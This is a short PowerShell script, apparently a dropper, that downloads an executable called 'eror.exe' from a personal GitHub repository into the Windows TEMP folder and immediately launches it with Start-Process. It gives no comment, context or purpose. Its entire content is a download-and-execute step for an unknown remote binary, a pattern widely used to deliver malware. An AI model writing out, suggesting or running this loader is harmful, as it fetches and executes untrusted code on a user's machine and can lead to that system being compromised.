$url = "https://raw.githubusercontent.com/hal0151/erorft/main/eror.exe"
$out = "$env:TEMP\eror.exe"
Invoke-WebRequest -Uri $url -OutFile $out
Start-Process -FilePath $out
